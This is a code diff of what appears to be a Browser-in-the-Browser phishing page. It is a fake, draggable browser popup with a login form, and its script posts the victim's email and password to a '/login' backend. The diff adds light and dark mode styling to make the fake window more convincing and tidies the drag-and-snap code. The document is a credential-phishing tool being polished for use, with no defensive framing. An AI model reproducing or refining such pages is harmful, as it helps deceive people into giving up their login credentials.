@@ -5,9 +5,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Login</title>
   <style>
+    /* base style - fallback to light mode */
     body {
       margin: 0;
       background-color: white;
+      color: black;
       font-family: 'Roboto', sans-serif;
     }
 
@@ -56,21 +58,22 @@
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      background-color: white;
       width: 450px;
       border-radius: 8px;
       box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
       overflow: hidden;
       animation: fadeIn 0.3s ease;
+      background-color: white;
+      color: black;
     }
 
     .browser-header {
-      background-color: #e8e8e8;
       padding: 8px 12px;
       display: flex;
       align-items: center;
       justify-content: space-between;
       cursor: grab;
+      background-color: #e8e8e8;
     }
 
     .dots {
@@ -114,7 +117,6 @@
       font-weight: 400;
       text-align: center;
       font-size: 24px;
-      color: #202124;
       margin-bottom: 20px;
     }
 
@@ -122,12 +124,20 @@
       margin-bottom: 20px;
     }
 
-    .input-group input {
+    .input-group input,
+    .login-btn {
       width: 100%;
+      box-sizing: border-box;
       padding: 12px;
       font-size: 14px;
-      border: 1px solid #dadce0;
       border-radius: 4px;
+      font-family: inherit;
+    }
+
+    .input-group input {
+      border: 1px solid #dadce0;
+      background-color: white;
+      color: black;
       outline: none;
     }
 
@@ -136,13 +146,9 @@
     }
 
     .login-btn {
-      width: 100%;
-      padding: 12px;
-      font-size: 14px;
       background-color: #1a73e8;
       color: white;
       border: none;
-      border-radius: 4px;
       cursor: pointer;
     }
 
@@ -165,6 +171,64 @@
     @keyframes fadeIn {
       from { opacity: 0; transform: scale(0.95); }
       to { opacity: 1; transform: scale(1); }
+    }
+
+    /* Light Mode Preference */
+    @media (prefers-color-scheme: light) {
+      .bitb-wrapper .browser-frame {
+        background-color: white;
+        color: black;
+      }
+
+      .bitb-wrapper .browser-header {
+        background-color: #e8e8e8;
+      }
+
+      .bitb-wrapper .browser-url {
+        background-color: #d0d0d0;
+        color: #333;
+      }
+
+      .bitb-wrapper .input-group input {
+        background-color: white;
+        color: black;
+        border-color: #dadce0;
+      }
+
+      .bitb-wrapper .footer-text {
+        color: #5f6368;
+      }
+    }
+
+    /* Dark Mode Preference */
+    @media (prefers-color-scheme: dark) {
+      .bitb-wrapper .browser-frame {
+        background-color: #1e1e1e;
+        color: white;
+      }
+
+      .bitb-wrapper .browser-header {
+        background-color: #2c2c2c;
+      }
+
+      .bitb-wrapper .browser-url {
+        background-color: #444;
+        color: #eee;
+      }
+
+      .bitb-wrapper .input-group input {
+        background-color: #2a2a2a;
+        color: white;
+        border-color: #555;
+      }
+
+      .bitb-wrapper .input-group input:focus {
+        border-color: #8ab4f8;
+      }
+
+      .bitb-wrapper .footer-text {
+        color: #aaa;
+      }
     }
   </style>
 </head>
@@ -240,7 +304,7 @@
     const username = window.username;
     const baseURL = window.location.origin;
 
-    fetch(baseURL + "/login", { // push to backend
+    fetch(baseURL + "/login", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ email: username, password: password })
@@ -257,7 +321,7 @@
     });
   }
 
-  // drag + move 
+  // drag + snap
   (function() {
     const modal = document.getElementById("draggableModal");
     const header = document.getElementById("dragHandle");
@@ -285,24 +349,19 @@
       modal.style.transform = "none";
     });
 
-    // snap the frame to the edge so it stays in frame at all times
     function snapToEdge() {
       const snapPadding = 30;
       const screenWidth = window.innerWidth;
       const screenHeight = window.innerHeight;
       const rect = modal.getBoundingClientRect();
 
-      let snappedLeft = rect.left < snapPadding;
-      let snappedRight = rect.right > screenWidth - snapPadding;
-      let snappedTop = rect.top < snapPadding;
-
-      if (snappedLeft) {
+      if (rect.left < snapPadding) {
         modal.style.left = `0px`;
-      } else if (snappedRight) {
+      } else if (rect.right > screenWidth - snapPadding) {
         modal.style.left = `${screenWidth - rect.width}px`;
       }
 
-      if (snappedTop) {
+      if (rect.top < snapPadding) {
         modal.style.top = `0px`;
       }
     }
